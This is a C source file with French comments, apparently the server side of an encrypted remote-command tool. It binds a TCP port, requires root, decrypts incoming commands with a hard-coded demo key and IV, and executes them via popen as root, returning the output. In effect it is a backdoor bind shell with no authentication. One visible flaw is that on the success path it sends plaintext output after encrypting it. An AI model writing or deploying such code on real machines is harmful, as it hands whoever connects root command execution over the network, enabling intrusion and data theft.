#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include "sender.h"
#include "receiver.h"
#include "encryption.h"
#undef stderr
#define stderr stdout

#define BUFFER_SIZE 1024

unsigned char KEY[32] = "aabcjdlsoeirjfhvufuslckdurtuzdui"; //Set for demo
unsigned char IV[16] = "ncbvjfkdoeirushd"; //Set for demo

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <port>\n", argv[0]);
        exit(1);
    }

    // Vérifier si le programme est exécuté avec les privilèges de root
    if (getuid() != 0) {
        printf("Ce programme doit être exécuté avec les privilèges de root.\n");
        exit(1);
    }

    int serverSocket, clientSocket;
    struct sockaddr_in serverAddress, clientAddress;
    char response[BUFFER_SIZE];

    // Créer une socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket < 0) {
        printf("Erreur lors de la création de la socket : %s\n", strerror(errno));
        exit(1);
    }

    // Spécifier l'adresse IP et le port du serveur
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(atoi(argv[1]));

    // Réutiliser l'adresse et le port même en cas de déconnexion brutale
    int option = 1;
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option)) < 0) {
        printf("Erreur lors de la configuration de la socket : %s\n", strerror(errno));
        exit(1);
    }

    // Lier le socket à l'adresse IP et au port
    if (bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        printf("Erreur lors du bind : %s\n", strerror(errno));
        exit(1);
    }

    // Mettre la socket en mode écoute
    if (listen(serverSocket, 1) < 0) {
        printf("Erreur lors de la mise en écoute : %s\n", strerror(errno));
        exit(1);
    }

    printf("Attente de connexion...\n");

    // Accepter une connexion entrante
    socklen_t clientAddressLength = sizeof(clientAddress);
    clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddress, &clientAddressLength);
    if (clientSocket < 0) {
        printf("Erreur lors de l'acceptation de la connexion : %s\n", strerror(errno));
        exit(1);
    }

    printf("Connexion établie avec le client %s:%d\n", inet_ntoa(clientAddress.sin_addr), ntohs(clientAddress.sin_port));

	while (1) {
		// Recevoir la commande du client en utilisant la fonction du receiver
		unsigned char command[BUFFER_SIZE];
		int bytesReceived = receive_command(clientSocket, command, BUFFER_SIZE);
		if (bytesReceived < 0) {
			perror("Erreur lors de la réception de la commande");
			exit(1);
		}

        //Déchiffrer la commande
        unsigned char decrypted_command[BUFFER_SIZE];
        int err;
        err = decrypt(decrypted_command, BUFFER_SIZE, KEY, IV, command); //TODO gérer erreurs

		// Vérifier si la commande contient "exit"
		if (strstr(decrypted_command, "exit") != NULL) {
			// Envoyer une réponse au client indiquant que le serveur a reçu "exit"
            const char *exitResponse = EXIT_MESSAGE;
			int result = send_response(clientSocket, exitResponse);
			if (result != 0) {
				perror("Erreur lors de l'envoi de la réponse");
				exit(1);
			}
            memset(command, 0, BUFFER_SIZE);

		} else {
			// Exécuter la commande (en tant que root)
			FILE *p;
			int output;
			p = popen(decrypted_command,"r"); /* Unix */
			if( p == NULL)
			{
				puts("Unable to open process");
				return(1);
			}

			// Lire la sortie de la commande
			char commandOutput[BUFFER_SIZE];
			memset(commandOutput, 0, sizeof(commandOutput));
			size_t bytesRead = fread(commandOutput, 1, BUFFER_SIZE - 1, p);
			if (bytesRead > 0) {
				// Envoyer la réponse au client en utilisant la fonction du sender
				unsigned char encryptedOutput[BUFFER_SIZE];
                err = encrypt(commandOutput, BUFFER_SIZE, KEY, IV, encryptedOutput); //TODO gérer erreurs
				
				int result = send_response(clientSocket, commandOutput);
				if (result != 0) {
					perror("Erreur lors de l'envoi de la réponse");
					pclose(p); // Fermer le processus avant de sortir
					exit(1);
				}
			} else {
				// Si la commande n'a pas de sortie, envoyer un message d'erreur au client
				unsigned char *errorResponse = "Commande non reconnue ou sans sortie.\n";
                strcpy(commandOutput, errorResponse);

                unsigned char encryptedOutput[BUFFER_SIZE];
                err = encrypt(commandOutput, BUFFER_SIZE, KEY, IV, encryptedOutput); //TODO gérer erreurs

				int result = send_response(clientSocket, encryptedOutput);
				if (result != 0) {
					perror("Erreur lors de l'envoi de la réponse");
					pclose(p); // Fermer le processus avant de sortir
					exit(1);
				}
			}

			pclose(p);
		}
	}

}